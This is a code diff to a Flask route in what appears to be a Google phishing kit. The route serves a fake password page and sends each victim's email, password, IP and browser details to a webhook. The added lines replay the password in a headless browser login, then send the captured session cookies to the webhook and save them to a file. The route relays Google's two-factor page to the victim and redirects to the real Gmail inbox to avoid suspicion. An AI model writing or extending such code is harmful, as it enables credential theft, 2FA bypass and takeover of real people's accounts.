@@ -220,18 +220,20 @@ def enter_password():
     email = session.get('email')
     error = None
     branding = None
+    password_val = None
+    show_loading = False
+
     if email:
         branding = get_google_email_details(email)
+
     if request.method == 'POST':
         password_val = request.form.get('password') or ''
         session['email'] = email
-        branding = get_google_email_details(email)
 
         # Collect info for webhook
         client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         user_agent = request.headers.get('User-Agent', '')
         import httpagentparser
-        import time
         browser_info = httpagentparser.detect(user_agent)
         user_browser = browser_info.get('browser', {}).get('name', '')
         browser_version = browser_info.get('browser', {}).get('version', '')
@@ -259,25 +261,45 @@ def enter_password():
             f"⏰ Time: {current_time}"
         )
         send_webhook_message(credentials_message)
-        # After capturing credentials, set authenticated flag and store password
-        session['authenticated'] = True
-        session['password'] = password_val  # Temporarily store for the flow
 
-        # Call Selenium headless login to process credentials and capture cookies
+        # Set flags for background login processing
+        session['authenticated'] = True
+        session['password'] = password_val
+
+        # First render: show password page again with loading indicator
+        show_loading = False
+        return render_template(
+            'password.html',
+            email=email,
+            banner=session.get('banner'),
+            background=session.get('background'),
+            error=error,
+            loading=show_loading
+        )
+
+    # Second render: after user re-submits password, process headless login
+    if request.method == 'GET' and session.get('authenticated') and session.get('password'):
+        email = session.get('email')
+        password_val = session.get('password')
         login_result = handle_headless_login(email, password_val)
 
         if login_result is not None and login_result.get('success'):
-            # Login successful, redirect user to Gmail inbox
+            # Login successful, capture cookies and send to webhook
+            cookies_json = json.dumps(cookies_to_json(login_result.get('cookies', [])), indent=2)
+            file_content = f"{email}\n{cookies_json}"
+            cookie_webhook_message = f"🍪 Google-Box-Cookies 🍪\n\n📧 Email: {email}\n🌐 IP Address: {request.headers.get('X-Forwarded-For', request.remote_addr)}\n\n```json\n{cookies_json}\n```"
+            send_webhook_message(cookie_webhook_message)
+            with open(COOKIE_TEMP_FILE, 'w') as f:
+                f.write(file_content)
             session.clear()
-            return redirect('https://mail.google.com/')
+            return redirect('https://mail.google.com/inbox/')
         elif login_result is not None and login_result.get('2fa_required'):
-            # 2FA required, render the Google 2FA challenge page for user to complete
             twofa_html = login_result.get('2fa_html', '')
-            # Render the raw HTML from Google for 2FA challenge
             return Response(twofa_html, mimetype='text/html')
         else:
-            # Login failed, show error on password page
             error = 'Invalid password or login failed.'
+            session['authenticated'] = False
+            session['password'] = None
             return render_template(
                 'password.html',
                 email=email,
@@ -286,16 +308,18 @@ def enter_password():
                 error=error,
                 loading=False
             )
-    else:
-        return render_template(
-            'password.html',
-            email=email,
-            banner=session.get('banner'),
-            background=session.get('background'),
-            error=error
-        )
 
-@app.route('/ajax-headless-login', methods=['POST'])
+    # Default render: show password page
+    return render_template(
+        'password.html',
+        email=email,
+        banner=session.get('banner'),
+        background=session.get('background'),
+        error=error,
+        loading=False
+    )
+
+@app.route('/ajax-headless-login', methods=['GET', 'POST'])
 def ajax_headless_login():
     if not session.get('authenticated'):
         return jsonify({'success': False, 'error': 'Not authenticated'}), 403
